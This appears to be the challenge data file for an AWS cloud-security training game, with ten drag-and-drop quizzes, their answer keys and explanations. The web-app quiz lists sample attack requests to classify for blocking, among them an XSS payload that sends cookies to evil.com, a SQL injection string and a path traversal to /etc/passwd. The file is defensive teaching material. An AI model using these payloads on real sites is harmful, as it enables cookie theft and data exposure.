/**
 * All 10 challenge definitions.
 *
 * Common shape:
 *   id          – unique slug
 *   domain      – display label
 *   title       – challenge title
 *   icon        – emoji icon
 *   difficulty  – 'easy' | 'medium' | 'hard'
 *   maxPoints   – point ceiling for this challenge (Easy=75, Medium=100, Hard=150)
 *   description – brief task description shown on Mission Board
 *   scenario    – full narrative shown on the Challenge screen
 *   type        – 'bucket' | 'order' | 'match'
 *   items       – draggable cards
 *   zones       – drop zones (for bucket / match types)
 *   correctAnswer – machine-readable answer for scoring
 *   explanation – shown on Results screen
 *   awsTool     – real AWS service that solves this
 *   clue        – hint text (costs 25 pts)
 */

export const challenges = [
  // ─────────────────────────────────────────────
  // 1. IAM — Fix the Policy  [Medium]
  // ─────────────────────────────────────────────
  {
    id: 'iam',
    domain: 'Identity & Access',
    title: 'Fix the Policy',
    icon: '🔐',
    difficulty: 'medium',
    maxPoints: 100,
    description: 'Drag permission statements into Allow or Deny to build a least-privilege IAM policy.',
    scenario:
      'A developer accidentally attached an overly-permissive policy to a Lambda function. You need to rebuild the policy from scratch. Drag each permission statement into the correct bucket — Allow only what the function actually needs, and explicitly Deny the rest.',
    type: 'bucket',
    items: [
      { id: 'iam-1', label: 's3:GetObject on app-data bucket', correct: 'allow' },
      { id: 'iam-2', label: 's3:DeleteBucket on *', correct: 'deny' },
      { id: 'iam-3', label: 'logs:CreateLogGroup', correct: 'allow' },
      { id: 'iam-4', label: 'iam:CreateUser on *', correct: 'deny' },
      { id: 'iam-5', label: 'logs:PutLogEvents', correct: 'allow' },
      { id: 'iam-6', label: 'iam:AttachUserPolicy on *', correct: 'deny' },
      { id: 'iam-7', label: 'dynamodb:GetItem on orders table', correct: 'allow' },
      { id: 'iam-8', label: 'ec2:TerminateInstances on *', correct: 'deny' },
    ],
    zones: [
      { id: 'allow', label: 'Allow', color: 'success' },
      { id: 'deny', label: 'Deny', color: 'danger' },
    ],
    correctAnswer: {
      allow: ['iam-1', 'iam-3', 'iam-5', 'iam-7'],
      deny: ['iam-2', 'iam-4', 'iam-6', 'iam-8'],
    },
    explanation:
      'A least-privilege IAM policy grants only the specific actions the resource needs to function — in this case S3 read access, CloudWatch Logs write, and DynamoDB read. Wildcard actions like s3:DeleteBucket, iam:CreateUser, and ec2:TerminateInstances should always be explicitly denied to prevent privilege escalation.',
    whyMatters: 'Over-privileged IAM roles are the #1 attack path in AWS breaches — a single compromised Lambda with admin-level permissions can bring down your entire account.',
    awsTool: 'AWS IAM Access Analyzer',
    clue: 'A Lambda function only needs to read data and write logs. Any action that creates, deletes, or modifies infrastructure is suspicious.',
  },

  // ─────────────────────────────────────────────
  // 2. Endpoint Protection — Triage the Findings  [Medium]
  // ─────────────────────────────────────────────
  {
    id: 'endpoint',
    domain: 'Endpoint Protection',
    title: 'Triage the Findings',
    icon: '🛡️',
    difficulty: 'medium',
    maxPoints: 100,
    description: 'GuardDuty findings are shown as cards. Drag them into severity order: Critical → High → Medium → Low.',
    scenario:
      'GuardDuty just fired 6 findings across your AWS account. Your job is to triage them — drag the finding cards into correct severity order from most critical to least critical. Response time matters.',
    type: 'order',
    items: [
      {
        id: 'ep-1',
        label: 'Trojan:EC2/DNSDataExfiltration',
        detail: 'EC2 instance querying known C2 domain via DNS',
        correct: 1,
      },
      {
        id: 'ep-2',
        label: 'UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B',
        detail: 'Root account login from anonymous proxy',
        correct: 2,
      },
      {
        id: 'ep-3',
        label: 'Recon:EC2/PortProbeUnprotectedPort',
        detail: 'Unusual port scan on EC2 instance',
        correct: 4,
      },
      {
        id: 'ep-4',
        label: 'CryptoCurrency:EC2/BitcoinTool.B',
        detail: 'EC2 querying Bitcoin mining pool',
        correct: 3,
      },
      {
        id: 'ep-5',
        label: 'Policy:IAMUser/RootCredentialUsage',
        detail: 'Root credentials used in the last 24 hours',
        correct: 5,
      },
      {
        id: 'ep-6',
        label: 'Behavior:EC2/NetworkPortUnusual',
        detail: 'EC2 communicating on unusual outbound port',
        correct: 6,
      },
    ],
    zones: [],
    correctAnswer: ['ep-1', 'ep-2', 'ep-4', 'ep-3', 'ep-5', 'ep-6'],
    explanation:
      'DNS data exfiltration to a C2 domain is the highest severity — active compromise. Root login from a proxy indicates likely account takeover. Crypto mining means a compromised instance. Port probing is reconnaissance (pre-attack). Root credential usage and unusual ports are medium-to-low findings requiring monitoring.',
    whyMatters: 'Slow triage kills incident response — every minute an active C2 channel is open, attackers are exfiltrating data. GuardDuty fires hundreds of findings; knowing which one to act on first is a real on-call skill.',
    awsTool: 'Amazon GuardDuty',
    clue: 'Think about active vs. passive threat indicators. Active data exfiltration to a known bad domain outranks credential misuse, which outranks reconnaissance.',
  },

  // ─────────────────────────────────────────────
  // 3. Web App Security — Block the Attack  [Easy]
  // ─────────────────────────────────────────────
  {
    id: 'webapp',
    domain: 'Web App Security',
    title: 'Block the Attack',
    icon: '🌐',
    difficulty: 'easy',
    maxPoints: 75,
    description: 'Classify each incoming web request — drag malicious traffic to WAF Block and legit traffic to Allow Through.',
    scenario:
      'Your WAF is in detection-only mode and you\'ve been asked to review the last 8 requests and set correct actions. Misclassifying legitimate traffic costs points — read the requests carefully before placing them.',
    type: 'bucket',
    items: [
      {
        id: 'wa-1',
        label: "GET /products?id=1 OR 1=1--",
        detail: 'SQL injection attempt via query param',
        correct: 'block',
      },
      {
        id: 'wa-2',
        label: "POST /login  body: username=admin&password=hunter2",
        detail: 'Standard login form submission',
        correct: 'allow',
      },
      {
        id: 'wa-3',
        label: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
        detail: 'Stored XSS payload in a comment field',
        correct: 'block',
      },
      {
        id: 'wa-4',
        label: 'GET /api/products — 5,000 req/s from 1 IP',
        detail: 'DDoS / rate-limit violation',
        correct: 'block',
      },
      {
        id: 'wa-5',
        label: "GET /search?q=blue+running+shoes",
        detail: 'Normal product search query',
        correct: 'allow',
      },
      {
        id: 'wa-6',
        label: "POST /upload  Content-Type: application/x-php",
        detail: 'Malicious file upload attempt',
        correct: 'block',
      },
      {
        id: 'wa-7',
        label: "GET /about-us  User-Agent: Mozilla/5.0 (compatible)",
        detail: 'Static page request from a browser',
        correct: 'allow',
      },
      {
        id: 'wa-8',
        label: "GET /admin/../../../etc/passwd",
        detail: 'Path traversal attempt',
        correct: 'block',
      },
    ],
    zones: [
      { id: 'block', label: 'WAF Block', color: 'danger' },
      { id: 'allow', label: 'Allow Through', color: 'success' },
    ],
    correctAnswer: {
      block: ['wa-1', 'wa-3', 'wa-4', 'wa-6', 'wa-8'],
      allow: ['wa-2', 'wa-5', 'wa-7'],
    },
    explanation:
      'AWS WAF rules should block SQL injection (OR 1=1), XSS payloads (script tags), rate-limit violations (5k req/s), PHP file uploads, and path traversal (../../). Standard form submissions, product searches, and browser GET requests are legitimate traffic and should not be blocked.',
    whyMatters: 'A single unblocked SQL injection on a poorly configured API gateway can expose your entire customer database — and blocking too aggressively breaks real user traffic, which is just as bad.',
    awsTool: 'AWS WAF + AWS Shield',
    clue: 'Look for SQL keywords, script tags, path separators (../), unusual Content-Types, and abnormal request rates. Normal web traffic has clean URLs and standard MIME types.',
  },

  // ─────────────────────────────────────────────
  // 4. Data Security — Classify the Data  [Medium]
  // ─────────────────────────────────────────────
  {
    id: 'data',
    domain: 'Data Security',
    title: 'Classify the Data',
    icon: '🗄️',
    difficulty: 'medium',
    maxPoints: 100,
    description: 'Drag each data type into the correct protection bucket: Encrypt with KMS, Scan with Macie, or No Action Needed.',
    scenario:
      'Your team is auditing a new S3 bucket before it goes live. Eight data types have been discovered in the bucket. Assign the correct protection action to each one.',
    type: 'bucket',
    items: [
      { id: 'ds-1', label: 'Social Security Numbers (SSNs)', correct: 'macie' },
      { id: 'ds-2', label: 'AWS Access Key ID + Secret', correct: 'macie' },
      { id: 'ds-3', label: 'Company public press release', correct: 'none' },
      { id: 'ds-4', label: 'Customer credit card numbers (PAN)', correct: 'kms' },
      { id: 'ds-5', label: 'Internal employee salary data', correct: 'kms' },
      { id: 'ds-6', label: 'Open-source software license file', correct: 'none' },
      { id: 'ds-7', label: 'Database password in a config file', correct: 'macie' },
      { id: 'ds-8', label: 'Healthcare records (PHI)', correct: 'kms' },
    ],
    zones: [
      { id: 'kms', label: 'Encrypt with KMS', color: 'orange' },
      { id: 'macie', label: 'Scan with Macie', color: 'sky' },
      { id: 'none', label: 'No Action Needed', color: 'neutral' },
    ],
    correctAnswer: {
      kms: ['ds-4', 'ds-5', 'ds-8'],
      macie: ['ds-1', 'ds-2', 'ds-7'],
      none: ['ds-3', 'ds-6'],
    },
    explanation:
      'Amazon Macie scans for sensitive data patterns (credentials, PII like SSNs, exposed API keys) already in your S3 buckets. AWS KMS encryption protects structured sensitive data at rest (PCI card numbers, HIPAA PHI, HR records). Publicly available content like press releases and open-source licenses require no special protection.',
    whyMatters: 'A misconfigured S3 bucket containing unencrypted PII is an automatic GDPR/HIPAA breach notification — companies have paid millions in fines for S3 buckets left public with no encryption.',
    awsTool: 'Amazon Macie + AWS KMS',
    clue: 'Macie detects — it scans for secrets and PII that should not be in S3 at all. KMS encrypts — it protects data that must be stored but needs to be locked down.',
  },

  // ─────────────────────────────────────────────
  // 5. Incident Response — Read the CloudTrail Log  [Hard]
  // ─────────────────────────────────────────────
  {
    id: 'incident',
    domain: 'Incident Response',
    title: 'Read the CloudTrail Log',
    icon: '📋',
    difficulty: 'hard',
    maxPoints: 150,
    description: 'Reconstruct a security incident by dragging CloudTrail events into the correct chronological order.',
    scenario:
      'An S3 bucket containing customer data was exfiltrated. CloudTrail captured 6 events. Reconstruct the attack timeline by dragging the events into the correct order — earliest event at the top.',
    type: 'order',
    items: [
      {
        id: 'ir-1',
        label: 'ConsoleLogin',
        detail: 'Root user login from IP 185.220.101.45 (Tor exit node) at 02:14 UTC',
        correct: 1,
      },
      {
        id: 'ir-2',
        label: 'GetBucketPolicy',
        detail: 'Enumerated bucket policy on customer-data-prod at 02:17 UTC',
        correct: 2,
      },
      {
        id: 'ir-3',
        label: 'PutBucketAcl',
        detail: 'Bucket ACL changed to public-read at 02:19 UTC',
        correct: 3,
      },
      {
        id: 'ir-4',
        label: 'ListObjects',
        detail: '4,200 objects enumerated in customer-data-prod at 02:20 UTC',
        correct: 4,
      },
      {
        id: 'ir-5',
        label: 'GetObject (bulk)',
        detail: '4,200 files downloaded to external IP 185.220.101.45 between 02:21–02:34 UTC',
        correct: 5,
      },
      {
        id: 'ir-6',
        label: 'DeleteBucket',
        detail: 'customer-data-prod bucket deleted at 02:35 UTC',
        correct: 6,
      },
    ],
    zones: [],
    correctAnswer: ['ir-1', 'ir-2', 'ir-3', 'ir-4', 'ir-5', 'ir-6'],
    explanation:
      'Classic S3 data theft pattern: (1) attacker authenticates via stolen root creds, (2) enumerates permissions, (3) makes bucket public, (4) lists all objects, (5) bulk-downloads everything, then (6) deletes the bucket to cover tracks. CloudTrail timestamps are the key — read the UTC times on each event.',
    whyMatters: 'This exact attack pattern was used in the 2019 Capital One breach — 100 million customer records stolen from a misconfigured S3 bucket. CloudTrail logs told the whole story after the fact.',
    awsTool: 'AWS CloudTrail + Amazon Detective',
    clue: 'Read the timestamps on each event. The attack follows a logical sequence: authenticate → enumerate → escalate permissions → list data → exfiltrate → destroy evidence.',
  },

  // ─────────────────────────────────────────────
  // 6. Backups & Recovery — Design the Backup Plan  [Easy]
  // ─────────────────────────────────────────────
  {
    id: 'backup',
    domain: 'Backups & Recovery',
    title: 'Design the Backup Plan',
    icon: '💾',
    difficulty: 'easy',
    maxPoints: 75,
    description: 'Match each backup strategy to the disaster scenario it best protects against.',
    scenario:
      'Your team needs to design a multi-layer backup strategy. Four disaster scenarios have been identified. Drag each backup strategy to the scenario it most directly defends against.',
    type: 'match',
    items: [
      { id: 'bk-1', label: 'S3 Versioning', correct: 'accidental-delete' },
      { id: 'bk-2', label: 'RDS Automated Snapshots', correct: 'db-corruption' },
      { id: 'bk-3', label: 'AWS Backup cross-region copy', correct: 'region-outage' },
      { id: 'bk-4', label: 'S3 Object Lock (WORM)', correct: 'ransomware' },
    ],
    zones: [
      { id: 'ransomware', label: 'Ransomware Attack', color: 'danger' },
      { id: 'accidental-delete', label: 'Accidental File Deletion', color: 'warn' },
      { id: 'region-outage', label: 'Full Region Outage', color: 'sky' },
      { id: 'db-corruption', label: 'Database Corruption', color: 'orange' },
    ],
    correctAnswer: {
      ransomware: ['bk-4'],
      'accidental-delete': ['bk-1'],
      'region-outage': ['bk-3'],
      'db-corruption': ['bk-2'],
    },
    explanation:
      'S3 Object Lock (WORM — Write Once Read Many) prevents ransomware from encrypting or deleting backups. S3 Versioning lets you restore previous file versions after accidental deletion. AWS Backup with cross-region copy ensures a full region failure does not destroy your data. RDS Automated Snapshots let you roll back a corrupted database to a known-good point-in-time.',
    whyMatters: 'Ransomware that reaches your AWS environment will immediately target your backups — if they are not immutable (WORM), you have nothing to recover from and are forced to pay the ransom.',
    awsTool: 'AWS Backup + S3 Object Lock',
    clue: 'Think about what each disaster actually destroys. Ransomware encrypts live data — you need immutable backups. Region outage takes down everything in one region — you need copies elsewhere.',
  },

  // ─────────────────────────────────────────────
  // 7. SCPs — Enforce the Guardrails  [Hard]
  // ─────────────────────────────────────────────
  {
    id: 'scp',
    domain: 'Identity & Access',
    title: 'Enforce the Guardrails',
    icon: '🏛️',
    difficulty: 'hard',
    maxPoints: 150,
    description: 'Drag each AWS action into the correct bucket — block it with an SCP or permit it across the organization.',
    scenario:
      'Your organization is rolling out AWS Organizations with Service Control Policies (SCPs) to enforce security guardrails across all member accounts. Review each action and decide: should it be blocked by an SCP (denied organization-wide) or permitted (not restricted by SCP)?',
    type: 'bucket',
    items: [
      { id: 'scp-1', label: 'cloudtrail:StopLogging', detail: 'Disabling the CloudTrail audit trail in any member account', correct: 'deny' },
      { id: 'scp-2', label: 'ec2:RunInstances in us-east-1', detail: 'Launching EC2 instances in an approved region', correct: 'allow' },
      { id: 'scp-3', label: 'ec2:RunInstances in ap-southeast-3', detail: 'Launching instances in a non-approved region', correct: 'deny' },
      { id: 'scp-4', label: 'cloudwatch:PutMetricAlarm', detail: 'Creating CloudWatch monitoring alarms', correct: 'allow' },
      { id: 'scp-5', label: 'iam:CreateAccessKey for root', detail: 'Generating programmatic credentials for the root account', correct: 'deny' },
      { id: 'scp-6', label: 'lambda:InvokeFunction', detail: 'Executing approved Lambda functions', correct: 'allow' },
      { id: 'scp-7', label: 'config:DeleteConfigRule', detail: 'Removing AWS Config compliance rules', correct: 'deny' },
      { id: 'scp-8', label: 'logs:CreateLogGroup', detail: 'Creating CloudWatch Logs log groups', correct: 'allow' },
    ],
    zones: [
      { id: 'deny', label: 'SCP Block (Deny)', color: 'danger' },
      { id: 'allow', label: 'Permit (Not Restricted)', color: 'success' },
    ],
    correctAnswer: {
      deny: ['scp-1', 'scp-3', 'scp-5', 'scp-7'],
      allow: ['scp-2', 'scp-4', 'scp-6', 'scp-8'],
    },
    explanation:
      'SCPs act as maximum permission guardrails for every account in your AWS Organization. Block: disabling CloudTrail (destroys audit trail), launching in non-approved regions (violates data residency), creating root access keys (a critical security anti-pattern), and deleting Config rules (undermines compliance enforcement). Permit: launching instances in approved regions, CloudWatch alarms, Lambda invocations, and log group creation are standard operations that should not be restricted.',
    whyMatters: 'SCPs are the only AWS control that even account-level administrators cannot override — they are your last line of defense when an account is fully compromised.',
    awsTool: 'AWS Organizations + SCPs',
    clue: 'SCPs should block anything that undermines security visibility (CloudTrail, Config), violates region policy, or grants dangerous root-level access. Routine operational actions in approved regions should be permitted.',
  },

  // ─────────────────────────────────────────────
  // 8. Secrets Manager — Rotate the Secrets  [Medium]
  // ─────────────────────────────────────────────
  {
    id: 'secrets',
    domain: 'Data Security',
    title: 'Rotate the Secrets',
    icon: '🔑',
    difficulty: 'medium',
    maxPoints: 100,
    description: 'Match each discovered secret to the correct remediation action — from immediate revocation to compliance sign-off.',
    scenario:
      'A security audit has uncovered 6 secrets across your AWS environment with very different risk profiles. Match each one to the correct remediation action before the window to act closes.',
    type: 'match',
    items: [
      { id: 'sm-1', label: 'DB password — last rotated 180 days ago', correct: 'auto-rotate' },
      { id: 'sm-2', label: 'AWS access key committed to public GitHub repo', correct: 'revoke-now' },
      { id: 'sm-3', label: 'Internal service token — rotates every 7 days via Lambda', correct: 'compliant' },
      { id: 'sm-4', label: 'Root account access key — currently active', correct: 'revoke-now' },
      { id: 'sm-5', label: 'Third-party SaaS OAuth token — vendor controls rotation', correct: 'manual-rotate' },
      { id: 'sm-6', label: 'RDS credentials stored in Secrets Manager with auto-rotation enabled', correct: 'compliant' },
    ],
    zones: [
      { id: 'revoke-now', label: 'Revoke Immediately', color: 'danger' },
      { id: 'auto-rotate', label: 'Enable Auto-Rotation', color: 'orange' },
      { id: 'manual-rotate', label: 'Schedule Manual Rotation', color: 'sky' },
      { id: 'compliant', label: 'Already Compliant', color: 'success' },
    ],
    correctAnswer: {
      'revoke-now': ['sm-2', 'sm-4'],
      'auto-rotate': ['sm-1'],
      'manual-rotate': ['sm-5'],
      'compliant': ['sm-3', 'sm-6'],
    },
    explanation:
      'Any secret exposed in a public repo or attached to the root account must be revoked immediately — assume it is already compromised. Stale database passwords should be enrolled in Secrets Manager auto-rotation. Third-party tokens where you do not control the rotation API require a manual rotation schedule. Secrets already enrolled in automated rotation are compliant.',
    whyMatters: 'AWS access keys committed to a public GitHub repo are harvested by automated bots within minutes — security researchers have watched accounts accumulate thousands of dollars in EC2 charges before the owner even noticed.',
    awsTool: 'AWS Secrets Manager',
    clue: 'Treat public exposure and root access keys as immediate incidents — revoke first, investigate after. Auto-rotation is for credentials you own and can rotate programmatically. Manual rotation is for credentials a third party controls.',
  },

  // ─────────────────────────────────────────────
  // 9. Inspector — Patch the Vulnerabilities  [Medium]
  // ─────────────────────────────────────────────
  {
    id: 'inspector',
    domain: 'Endpoint Protection',
    title: 'Patch the Vulnerabilities',
    icon: '🔍',
    difficulty: 'medium',
    maxPoints: 100,
    description: 'Amazon Inspector found 6 vulnerabilities across your EC2 fleet. Drag them into remediation priority order — most critical first.',
    scenario:
      'Amazon Inspector has completed a scan of your EC2 fleet and raised 6 findings with different severity levels and attack surfaces. Order them from the highest remediation priority (top) to the lowest (bottom).',
    type: 'order',
    items: [
      {
        id: 'ins-1',
        label: 'CVE-2021-44228 — Apache Log4j RCE (CVSS 10.0)',
        detail: 'Unauthenticated remote code execution on an internet-facing EC2 instance',
        correct: 1,
      },
      {
        id: 'ins-2',
        label: 'CVE-2022-0778 — OpenSSL infinite loop (CVSS 7.5)',
        detail: 'Denial-of-service via malformed TLS certificate — affects public load balancer',
        correct: 2,
      },
      {
        id: 'ins-3',
        label: 'Port 22 (SSH) open to 0.0.0.0/0',
        detail: 'Unintended network exposure — SSH accessible from any IP on the internet',
        correct: 3,
      },
      {
        id: 'ins-4',
        label: 'CVE-2023-0286 — OpenSSL type confusion (CVSS 5.9)',
        detail: 'Memory corruption in X.509 certificate handling — internal instances only',
        correct: 4,
      },
      {
        id: 'ins-5',
        label: 'Python 3.8 runtime — end of life, multiple medium CVEs',
        detail: 'Outdated runtime accumulating known vulnerabilities — no active exploit observed',
        correct: 5,
      },
      {
        id: 'ins-6',
        label: 'Missing HTTP security headers on internal dashboard',
        detail: 'Informational — no CVE, low exploitability, accessible only on private VPC',
        correct: 6,
      },
    ],
    zones: [],
    correctAnswer: ['ins-1', 'ins-2', 'ins-3', 'ins-4', 'ins-5', 'ins-6'],
    explanation:
      'Log4Shell (CVE-2021-44228) is CVSS 10.0 with active internet-facing exposure — always priority one. The OpenSSL DoS (CVSS 7.5) can take down public-facing services. Open SSH to 0.0.0.0/0 is active network exposure increasing attack surface. The OpenSSL type confusion (CVSS 5.9) is medium severity on internal hosts. EOL Python runtimes accumulate risk over time but have no active exploit. Missing security headers on internal-only services are informational last.',
    whyMatters: 'Log4Shell was actively exploited within hours of public disclosure — organizations that triaged by CVSS score and internet exposure patched in time; those that worked through a flat list did not.',
    awsTool: 'Amazon Inspector',
    clue: 'Sort by: CVSS score first, then consider internet-facing vs internal exposure. RCE outranks DoS. Active open ports outrank "could be exploited someday" findings.',
  },

  // ─────────────────────────────────────────────
  // 10. Systems Manager — Patch the Fleet  [Hard]
  // ─────────────────────────────────────────────
  {
    id: 'ssm',
    domain: 'Endpoint Protection',
    title: 'Patch the Fleet',
    icon: '⚙️',
    difficulty: 'hard',
    maxPoints: 150,
    description: 'Classify each SSM task into the correct capability: Run Command, State Manager, or Patch Manager.',
    scenario:
      'Your team is standardizing how AWS Systems Manager is used across a fleet of 200 EC2 instances. Classify each operational task into the correct SSM capability — the right tool depends on whether the task is one-time, continuous, or patch-specific.',
    type: 'bucket',
    items: [
      { id: 'ssm-1', label: 'Install Apache on 50 instances right now', detail: 'One-time immediate execution across a target set', correct: 'run-command' },
      { id: 'ssm-2', label: 'Ensure CloudWatch agent is always installed fleet-wide', detail: 'Ongoing configuration that must survive reboots and new instances', correct: 'state-manager' },
      { id: 'ssm-3', label: 'Apply critical OS patches during Sunday maintenance window', detail: 'Scheduled patch deployment with approval rules', correct: 'patch-manager' },
      { id: 'ssm-4', label: 'Reboot a single instance after a manual config change', detail: 'One-time ad-hoc operation on a specific instance', correct: 'run-command' },
      { id: 'ssm-5', label: 'Enforce a CIS hardening baseline on all new instances', detail: 'Continuously re-applied configuration for compliance', correct: 'state-manager' },
      { id: 'ssm-6', label: 'Scan the fleet for missing security patches daily', detail: 'Recurring compliance scan with a patch baseline', correct: 'patch-manager' },
      { id: 'ssm-7', label: 'Collect software inventory from all managed instances', detail: 'Continuous data collection updated on a schedule', correct: 'state-manager' },
      { id: 'ssm-8', label: 'Run a custom diagnostic script on one EC2 instance', detail: 'One-time targeted troubleshooting operation', correct: 'run-command' },
    ],
    zones: [
      { id: 'run-command', label: 'Run Command', color: 'sky' },
      { id: 'state-manager', label: 'State Manager', color: 'orange' },
      { id: 'patch-manager', label: 'Patch Manager', color: 'success' },
    ],
    correctAnswer: {
      'run-command': ['ssm-1', 'ssm-4', 'ssm-8'],
      'state-manager': ['ssm-2', 'ssm-5', 'ssm-7'],
      'patch-manager': ['ssm-3', 'ssm-6'],
    },
    explanation:
      'Run Command executes one-time, on-demand scripts or commands across any set of instances — ideal for immediate or ad-hoc tasks. State Manager enforces continuous configuration compliance — it repeatedly applies associations to keep instances in a desired state (CloudWatch agent installed, hardening baseline applied, inventory collected). Patch Manager is purpose-built for OS patching workflows — scanning for missing patches and deploying them through maintenance windows.',
    whyMatters: 'SSM eliminates the need for SSH bastion hosts entirely — no open port 22, no stored SSH keys, full auditability — which removes one of the most common attack surfaces in AWS environments.',
    awsTool: 'AWS Systems Manager',
    clue: 'Ask yourself: is this one-time (Run Command), always-on / re-applied (State Manager), or specifically about OS patches and compliance scanning (Patch Manager)?',
  },
];

export const CHALLENGE_MAP = Object.fromEntries(challenges.map((c) => [c.id, c]));
export const CHALLENGE_IDS = challenges.map((c) => c.id);
